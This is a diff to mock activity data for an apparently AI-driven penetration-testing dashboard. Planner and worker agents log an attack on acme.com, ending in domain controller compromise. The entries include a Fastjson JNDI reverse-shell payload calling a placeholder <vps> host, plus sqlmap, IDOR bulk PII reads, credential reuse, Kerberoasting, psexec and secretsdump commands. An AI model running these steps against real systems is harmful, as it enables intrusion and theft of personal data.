@@ -1298,9 +1298,9 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
 export const activity: Activity[] = [
   // planner —— 每轮完整决策链：读态势 → 拉 worker 产出对照 → 判目标 → add_intent 派方向
   // ── 第 0 轮 · 目标拆解与首批意图（2026-07-24 09:12）──
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
+  { seq: "1000", worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
   {
-    seq: 1001,
+    seq: "1001",
     worker: "planner",
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
@@ -1308,7 +1308,7 @@ export const activity: Activity[] = [
       "graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop / vpn 五个入口。图里没有 fact，我只能做【极轻量只读探测】把初始意图说具体，绝不在 plan 里把活干了。",
   },
   {
-    seq: 1002,
+    seq: "1002",
     worker: "planner",
     ts: T("2026-07-24T09:12:40Z"),
     kind: "tool_use",
@@ -1318,7 +1318,7 @@ export const activity: Activity[] = [
     detail: "开局态势几乎空白，做 ≤3 次只读探测校准初始意图方向（不做枚举/验证，那是 worker 的活）。",
   },
   {
-    seq: 1003,
+    seq: "1003",
     worker: "planner",
     ts: T("2026-07-24T09:12:52Z"),
     kind: "tool_result",
@@ -1329,7 +1329,7 @@ export const activity: Activity[] = [
     detail: "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。",
   },
   {
-    seq: 1004,
+    seq: "1004",
     worker: "planner",
     ts: T("2026-07-24T09:13:00Z"),
     kind: "tool_use",
@@ -1340,7 +1340,7 @@ export const activity: Activity[] = [
       "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
   },
   {
-    seq: 1005,
+    seq: "1005",
     worker: "planner",
     ts: T("2026-07-24T09:13:02Z"),
     kind: "tool_result",
@@ -1350,7 +1350,7 @@ export const activity: Activity[] = [
     detail: "刻意保持路线多样：i1 侦察 + i2（g1 认证路线）+ i4/i5（g2 数据路线），2 条独立机理并行，不过早收敛。",
   },
   {
-    seq: 1006,
+    seq: "1006",
     worker: "planner",
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
@@ -1359,9 +1359,9 @@ export const activity: Activity[] = [
   },
 
   // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
-  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
+  { seq: "1100", worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
   {
-    seq: 1101,
+    seq: "1101",
     worker: "planner",
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
@@ -1369,7 +1369,7 @@ export const activity: Activity[] = [
       "对照 recent_facts：workG 交回 faGit「.git 可下载，git-dumper 还原出后端源码」与 faCreds「config.php 硬编码 sa/Acme@2021（疑似内网通用）」；work#6 指纹交回 fa3「shop 命中 Fastjson 1.2.24（存在已知反序列化 RCE）」。两条【材料性新机理】：① 硬编码 DB 口令可能横跨内网复用；② Fastjson 有成熟 RCE 打法。这打开一条与现有认证/注入路线【本质不同】的入口——从 shop 直接 RCE 突破进 DMZ。先拉 faGit 详情核实产物。",
   },
   {
-    seq: 1102,
+    seq: "1102",
     worker: "planner",
     ts: T("2026-07-25T14:12:28Z"),
     kind: "tool_use",
@@ -1379,7 +1379,7 @@ export const activity: Activity[] = [
     detail: "add_intent 前先看 worker 到底还原出什么，避免凭指纹臆测方向。",
   },
   {
-    seq: 1103,
+    seq: "1103",
     worker: "planner",
     ts: T("2026-07-25T14:12:35Z"),
     kind: "tool_result",
@@ -1390,7 +1390,7 @@ export const activity: Activity[] = [
     detail: "硬编码指向内网 10.10.10.5(FS01)，佐证 faCreds 的「内网通用」推断——RCE 落地后这组口令值得复用。",
   },
   {
-    seq: 1104,
+    seq: "1104",
     worker: "planner",
     ts: T("2026-07-25T14:12:50Z"),
     kind: "tool_use",
@@ -1401,7 +1401,7 @@ export const activity: Activity[] = [
       "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
   },
   {
-    seq: 1105,
+    seq: "1105",
     worker: "planner",
     ts: T("2026-07-25T14:12:52Z"),
     kind: "tool_result",
@@ -1410,7 +1410,7 @@ export const activity: Activity[] = [
     summary: "2 intents created → ids=[i6, i7]，已由 fa3 连入血缘",
   },
   {
-    seq: 1106,
+    seq: "1106",
     worker: "planner",
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
@@ -1420,14 +1420,14 @@ export const activity: Activity[] = [
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
   {
-    seq: 1200,
+    seq: "1200",
     worker: "planner",
     ts: T("2026-07-25T20:25:00Z"),
     kind: "round",
     summary: "第 2 轮 · 立足点已建，转内网",
   },
   {
-    seq: 1201,
+    seq: "1201",
     worker: "planner",
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
@@ -1435,7 +1435,7 @@ export const activity: Activity[] = [
       "对照血缘：i7 交回 fa4「反弹 shell www-data@dmz-web01(10.0.20.15)，位于 DMZ 段」；提权链交回 fa5「sudo -l 命中 NOPASSWD python3 → 可提权 root」、fa6「立足点第二网卡直连内网 10.10.10.0/24」。g3 的验收条件（突破 DMZ + 建立足点）已被 fa4+fa6 直接满足。先核实 fa6 的内网可达性再 prove_goal。",
   },
   {
-    seq: 1202,
+    seq: "1202",
     worker: "planner",
     ts: T("2026-07-25T20:25:30Z"),
     kind: "tool_use",
@@ -1444,7 +1444,7 @@ export const activity: Activity[] = [
     summary: "node_detail(fa6) —— 确认双网卡与内网可达",
   },
   {
-    seq: 1203,
+    seq: "1203",
     worker: "planner",
     ts: T("2026-07-25T20:25:38Z"),
     kind: "tool_result",
@@ -1453,7 +1453,7 @@ export const activity: Activity[] = [
     summary: "fa6 证据：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(内网)；ping 10.10.10.10 通，跨越 DMZ 边界成立",
   },
   {
-    seq: 1204,
+    seq: "1204",
     worker: "planner",
     ts: T("2026-07-25T20:25:50Z"),
     kind: "tool_use",
@@ -1464,7 +1464,7 @@ export const activity: Activity[] = [
       "reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。",
   },
   {
-    seq: 1205,
+    seq: "1205",
     worker: "planner",
     ts: T("2026-07-25T20:25:52Z"),
     kind: "tool_result",
@@ -1473,7 +1473,7 @@ export const activity: Activity[] = [
     summary: "goal g3 → met（证据 fa6 已连入）；仍有 g1/g2/g4 未达成，任务继续",
   },
   {
-    seq: 1206,
+    seq: "1206",
     worker: "planner",
     ts: T("2026-07-25T20:26:10Z"),
     kind: "tool_use",
@@ -1484,7 +1484,7 @@ export const activity: Activity[] = [
       "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
   },
   {
-    seq: 1207,
+    seq: "1207",
     worker: "planner",
     ts: T("2026-07-25T20:26:12Z"),
     kind: "tool_result",
@@ -1493,7 +1493,7 @@ export const activity: Activity[] = [
     summary: "4 intents created → ids=[i9, i10, i11, i12]",
   },
   {
-    seq: 1208,
+    seq: "1208",
     worker: "planner",
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
@@ -1502,9 +1502,9 @@ export const activity: Activity[] = [
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
-  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
+  { seq: "1300", worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
   {
-    seq: 1301,
+    seq: "1301",
     worker: "planner",
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
@@ -1512,7 +1512,7 @@ export const activity: Activity[] = [
       "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 acme\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。",
   },
   {
-    seq: 1302,
+    seq: "1302",
     worker: "planner",
     ts: T("2026-07-26T00:25:30Z"),
     kind: "tool_use",
@@ -1521,7 +1521,7 @@ export const activity: Activity[] = [
     summary: "list_findings —— 核对 DC01 沦陷的确认证据",
   },
   {
-    seq: 1303,
+    seq: "1303",
     worker: "planner",
     ts: T("2026-07-26T00:25:40Z"),
     kind: "tool_result",
@@ -1531,7 +1531,7 @@ export const activity: Activity[] = [
       "F-09「域控 DC01 完全控制 / secretsdump 导出全域哈希」critical（证据：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；上游链 fa9→fa10→i13 完整",
   },
   {
-    seq: 1304,
+    seq: "1304",
     worker: "planner",
     ts: T("2026-07-26T00:25:52Z"),
     kind: "tool_use",
@@ -1542,7 +1542,7 @@ export const activity: Activity[] = [
       "reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。",
   },
   {
-    seq: 1305,
+    seq: "1305",
     worker: "planner",
     ts: T("2026-07-26T00:25:54Z"),
     kind: "tool_result",
@@ -1551,7 +1551,7 @@ export const activity: Activity[] = [
     summary: "goal g4 → met；系统提示：g2 仍 open，非最后一个目标，任务未整体收官",
   },
   {
-    seq: 1306,
+    seq: "1306",
     worker: "planner",
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
@@ -1561,14 +1561,14 @@ export const activity: Activity[] = [
 
   // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
   {
-    seq: 1400,
+    seq: "1400",
     worker: "planner",
     ts: T("2026-07-26T03:55:00Z"),
     kind: "round",
     summary: "第 4 轮 · 后台达成，收敛 g2",
   },
   {
-    seq: 1401,
+    seq: "1401",
     worker: "planner",
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
@@ -1576,7 +1576,7 @@ export const activity: Activity[] = [
       "对照 recent_facts：work#2 用 faCreds 里的 Acme@2021 命中 admin 后台（i2 done），后台管理权限到手——g1 验收达成，先 prove_goal 盖章。随后做【量化验收核对】：g2「读取用户敏感数据」当前只有 i3/i5 摸到接口面、尚未真正取到批量数据，实测未达标，【禁止】prove_goal，改为提优先级补足取数意图。",
   },
   {
-    seq: 1402,
+    seq: "1402",
     worker: "planner",
     ts: T("2026-07-26T03:55:26Z"),
     kind: "tool_use",
@@ -1587,7 +1587,7 @@ export const activity: Activity[] = [
       "reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
   },
   {
-    seq: 1403,
+    seq: "1403",
     worker: "planner",
     ts: T("2026-07-26T03:55:28Z"),
     kind: "tool_result",
@@ -1596,7 +1596,7 @@ export const activity: Activity[] = [
     summary: "goal g1 → met；剩余未达成：g2",
   },
   {
-    seq: 1404,
+    seq: "1404",
     worker: "planner",
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
@@ -1604,7 +1604,7 @@ export const activity: Activity[] = [
       "g2 量化核对：目标要求『读取用户敏感数据』=实际拿到批量用户记录。graph_overview 里 findings 尚无『成功导出用户数据』条目，i3/i5 均 running 未回取数结果——实测未达标。严禁以『后台已进、大体达成』提前标 met，继续派意图补足差距。",
   },
   {
-    seq: 1405,
+    seq: "1405",
     worker: "planner",
     ts: T("2026-07-26T03:55:52Z"),
     kind: "tool_use",
@@ -1615,7 +1615,7 @@ export const activity: Activity[] = [
       "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
   },
   {
-    seq: 1406,
+    seq: "1406",
     worker: "planner",
     ts: T("2026-07-26T03:55:54Z"),
     kind: "tool_result",
@@ -1624,7 +1624,7 @@ export const activity: Activity[] = [
     summary: "2 intents updated → ids=[i3, i5]（优先级升至 9，描述细化为『批量取数』）",
   },
   {
-    seq: 1407,
+    seq: "1407",
     worker: "planner",
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
@@ -1634,7 +1634,7 @@ export const activity: Activity[] = [
 
   // work#1 · i1 子域枚举与端口扫描（done）
   {
-    seq: 10,
+    seq: "10",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:20:00Z"),
@@ -1642,7 +1642,7 @@ export const activity: Activity[] = [
     summary: "先被动侦察子域，再对存活主机做端口/服务识别。",
   },
   {
-    seq: 11,
+    seq: "11",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:20:30Z"),
@@ -1652,7 +1652,7 @@ export const activity: Activity[] = [
     summary: "subfinder -d acme.com -silent | httpx -silent -sc -title",
   },
   {
-    seq: 12,
+    seq: "12",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:22:10Z"),
@@ -1664,7 +1664,7 @@ export const activity: Activity[] = [
     detail: "5 个存活子域，其中 admin 是后台登录页。",
   },
   {
-    seq: 13,
+    seq: "13",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:23:00Z"),
@@ -1674,7 +1674,7 @@ export const activity: Activity[] = [
     summary: "nmap -sV -T4 -p- 203.0.113.10",
   },
   {
-    seq: 14,
+    seq: "14",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:26:40Z"),
@@ -1685,7 +1685,7 @@ export const activity: Activity[] = [
     detail: "开放 22/80/443。",
   },
   {
-    seq: 15,
+    seq: "15",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:27:00Z"),
@@ -1695,7 +1695,7 @@ export const activity: Activity[] = [
     summary: "upsert_asset × 6（子域+服务）",
   },
   {
-    seq: 16,
+    seq: "16",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:27:01Z"),
@@ -1705,7 +1705,7 @@ export const activity: Activity[] = [
     summary: "6 assets upserted",
   },
   {
-    seq: 17,
+    seq: "17",
     worker: "work#1",
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
@@ -1719,7 +1719,7 @@ export const activity: Activity[] = [
 
   // work#2 · i2 后台默认口令（done，证明 g1）
   {
-    seq: 20,
+    seq: "20",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:31:00Z"),
@@ -1727,7 +1727,7 @@ export const activity: Activity[] = [
     summary: "后台是 Element-UI，登录接口无验证码、无速率限制。先试默认口令表，再上字典。",
   },
   {
-    seq: 21,
+    seq: "21",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:32:00Z"),
@@ -1737,7 +1737,7 @@ export const activity: Activity[] = [
     summary: "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
   },
   {
-    seq: 22,
+    seq: "22",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:32:03Z"),
@@ -1748,7 +1748,7 @@ export const activity: Activity[] = [
     detail: "admin/admin 失败。",
   },
   {
-    seq: 23,
+    seq: "23",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:32:30Z"),
@@ -1758,7 +1758,7 @@ export const activity: Activity[] = [
     summary: "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
   },
   {
-    seq: 24,
+    seq: "24",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:32:33Z"),
@@ -1769,7 +1769,7 @@ export const activity: Activity[] = [
     detail: "admin/admin123 登录成功，拿到会话 cookie。",
   },
   {
-    seq: 25,
+    seq: "25",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:33:10Z"),
@@ -1779,7 +1779,7 @@ export const activity: Activity[] = [
     summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
   },
   {
-    seq: 26,
+    seq: "26",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:33:12Z"),
@@ -1790,7 +1790,7 @@ export const activity: Activity[] = [
     detail: "确认已进入后台控制台。",
   },
   {
-    seq: 27,
+    seq: "27",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:34:00Z"),
@@ -1800,7 +1800,7 @@ export const activity: Activity[] = [
     summary: "report_finding(Default Credentials, high)",
   },
   {
-    seq: 28,
+    seq: "28",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:34:01Z"),
@@ -1810,7 +1810,7 @@ export const activity: Activity[] = [
     summary: "finding f-6 已记录，并连到目标 g1（proves）",
   },
   {
-    seq: 29,
+    seq: "29",
     worker: "work#2",
     intent_id: "i2",
     ts: T("2026-07-26T03:50:00Z"),
@@ -1824,7 +1824,7 @@ export const activity: Activity[] = [
 
   // work#4 · i4 SQL 注入（done）
   {
-    seq: 40,
+    seq: "40",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-25T22:01:00Z"),
@@ -1832,7 +1832,7 @@ export const activity: Activity[] = [
     summary: "search?q= 结果页把 q 拼进标题，先手工加单引号看报错。",
   },
   {
-    seq: 41,
+    seq: "41",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-25T22:02:00Z"),
@@ -1842,7 +1842,7 @@ export const activity: Activity[] = [
     summary: "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
   },
   {
-    seq: 42,
+    seq: "42",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-25T22:02:04Z"),
@@ -1853,7 +1853,7 @@ export const activity: Activity[] = [
     detail: "MSSQL 报错型注入迹象。",
   },
   {
-    seq: 43,
+    seq: "43",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-25T22:03:00Z"),
@@ -1863,7 +1863,7 @@ export const activity: Activity[] = [
     summary: "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
   },
   {
-    seq: 44,
+    seq: "44",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-26T01:18:00Z"),
@@ -1875,7 +1875,7 @@ export const activity: Activity[] = [
     detail: "确认可注入，枚举出 4 个库。",
   },
   {
-    seq: 45,
+    seq: "45",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-26T01:19:00Z"),
@@ -1885,7 +1885,7 @@ export const activity: Activity[] = [
     summary: "report_finding(SQL Injection, high)",
   },
   {
-    seq: 46,
+    seq: "46",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-26T01:19:01Z"),
@@ -1895,7 +1895,7 @@ export const activity: Activity[] = [
     summary: "finding f-1 已记录",
   },
   {
-    seq: 47,
+    seq: "47",
     worker: "work#4",
     intent_id: "i4",
     ts: T("2026-07-26T01:20:00Z"),
@@ -1909,7 +1909,7 @@ export const activity: Activity[] = [
 
   // work#5 · i5 IDOR（running）
   {
-    seq: 50,
+    seq: "50",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:31:00Z"),
@@ -1917,7 +1917,7 @@ export const activity: Activity[] = [
     summary: "/v1/orders?id= 是数字自增 id，典型 IDOR 面。先取自己的单，再改 id 看能否读他人。",
   },
   {
-    seq: 51,
+    seq: "51",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:40:00Z"),
@@ -1927,7 +1927,7 @@ export const activity: Activity[] = [
     summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
   },
   {
-    seq: 52,
+    seq: "52",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:40:02Z"),
@@ -1938,7 +1938,7 @@ export const activity: Activity[] = [
     detail: "自己的订单，正常。",
   },
   {
-    seq: 53,
+    seq: "53",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:43:00Z"),
@@ -1948,7 +1948,7 @@ export const activity: Activity[] = [
     summary: "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
   },
   {
-    seq: 54,
+    seq: "54",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:43:02Z"),
@@ -1959,7 +1959,7 @@ export const activity: Activity[] = [
     detail: "越权读到他人订单（含手机号/地址），无归属校验。",
   },
   {
-    seq: 55,
+    seq: "55",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:44:00Z"),
@@ -1969,7 +1969,7 @@ export const activity: Activity[] = [
     summary: "report_finding(IDOR, high)",
   },
   {
-    seq: 56,
+    seq: "56",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T02:44:01Z"),
@@ -1979,7 +1979,7 @@ export const activity: Activity[] = [
     summary: "finding f-2 已记录",
   },
   {
-    seq: 57,
+    seq: "57",
     worker: "work#5",
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
@@ -1989,7 +1989,7 @@ export const activity: Activity[] = [
 
   // work#3 · i3 后台用户接口枚举（running）
   {
-    seq: 60,
+    seq: "60",
     worker: "work#3",
     intent_id: "i3",
     ts: T("2026-07-26T03:56:00Z"),
@@ -1997,7 +1997,7 @@ export const activity: Activity[] = [
     summary: "已有后台会话，枚举管理接口，找能批量导出用户敏感数据的入口（目标②）。",
   },
   {
-    seq: 61,
+    seq: "61",
     worker: "work#3",
     intent_id: "i3",
     ts: T("2026-07-26T03:57:00Z"),
@@ -2007,7 +2007,7 @@ export const activity: Activity[] = [
     summary: "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
   },
   {
-    seq: 62,
+    seq: "62",
     worker: "work#3",
     intent_id: "i3",
     ts: T("2026-07-26T03:57:02Z"),
@@ -2018,7 +2018,7 @@ export const activity: Activity[] = [
     detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。",
   },
   {
-    seq: 63,
+    seq: "63",
     worker: "work#3",
     intent_id: "i3",
     ts: T("2026-07-26T03:58:20Z"),
@@ -2028,7 +2028,7 @@ export const activity: Activity[] = [
 
   // workG · ig .git 源码泄露与硬编码凭据（done）
   {
-    seq: 310,
+    seq: "310",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
@@ -2036,7 +2036,7 @@ export const activity: Activity[] = [
     summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。",
   },
   {
-    seq: 311,
+    seq: "311",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:27:00Z"),
@@ -2046,7 +2046,7 @@ export const activity: Activity[] = [
     summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
   },
   {
-    seq: 312,
+    seq: "312",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:27:02Z"),
@@ -2057,7 +2057,7 @@ export const activity: Activity[] = [
     detail: ".git 目录对外可访问。",
   },
   {
-    seq: 313,
+    seq: "313",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:28:00Z"),
@@ -2067,7 +2067,7 @@ export const activity: Activity[] = [
     summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
   },
   {
-    seq: 314,
+    seq: "314",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:30:00Z"),
@@ -2078,7 +2078,7 @@ export const activity: Activity[] = [
     detail: "完整后端源码已还原到 /tmp/acme。",
   },
   {
-    seq: 315,
+    seq: "315",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:34:00Z"),
@@ -2088,7 +2088,7 @@ export const activity: Activity[] = [
     summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
   },
   {
-    seq: 316,
+    seq: "316",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:34:03Z"),
@@ -2099,7 +2099,7 @@ export const activity: Activity[] = [
     detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。",
   },
   {
-    seq: 317,
+    seq: "317",
     worker: "workG",
     intent_id: "ig",
     ts: T("2026-07-25T20:36:00Z"),
@@ -2113,7 +2113,7 @@ export const activity: Activity[] = [
 
   // work#6 · i6 shop 指纹与 CVE 关联（done）
   {
-    seq: 320,
+    seq: "320",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:22:00Z"),
@@ -2121,7 +2121,7 @@ export const activity: Activity[] = [
     summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。",
   },
   {
-    seq: 321,
+    seq: "321",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:24:00Z"),
@@ -2131,7 +2131,7 @@ export const activity: Activity[] = [
     summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
   },
   {
-    seq: 322,
+    seq: "322",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:24:03Z"),
@@ -2142,7 +2142,7 @@ export const activity: Activity[] = [
     detail: "Java 技术栈，存在 /api/import 接受 JSON body。",
   },
   {
-    seq: 323,
+    seq: "323",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:30:00Z"),
@@ -2153,7 +2153,7 @@ export const activity: Activity[] = [
       'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
   },
   {
-    seq: 324,
+    seq: "324",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:31:00Z"),
@@ -2164,7 +2164,7 @@ export const activity: Activity[] = [
     detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。",
   },
   {
-    seq: 325,
+    seq: "325",
     worker: "work#6",
     intent_id: "i6",
     ts: T("2026-07-25T14:40:00Z"),
@@ -2178,7 +2178,7 @@ export const activity: Activity[] = [
 
   // work#7 · i7 反序列化 RCE 拿反弹 shell（done，证明 g3）
   {
-    seq: 330,
+    seq: "330",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
@@ -2186,7 +2186,7 @@ export const activity: Activity[] = [
     summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。",
   },
   {
-    seq: 331,
+    seq: "331",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:15:00Z"),
@@ -2196,7 +2196,7 @@ export const activity: Activity[] = [
     summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务",
   },
   {
-    seq: 332,
+    seq: "332",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:16:00Z"),
@@ -2207,7 +2207,7 @@ export const activity: Activity[] = [
     detail: "恶意服务就绪。",
   },
   {
-    seq: 333,
+    seq: "333",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:20:00Z"),
@@ -2218,7 +2218,7 @@ export const activity: Activity[] = [
       'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
   },
   {
-    seq: 334,
+    seq: "334",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:21:00Z"),
@@ -2229,7 +2229,7 @@ export const activity: Activity[] = [
     detail: "payload 成功触发。",
   },
   {
-    seq: 335,
+    seq: "335",
     worker: "work#7",
     intent_id: "i7",
     ts: T("2026-07-25T15:24:00Z"),
@@ -2239,7 +2239,7 @@ export const activity: Activity[] = [
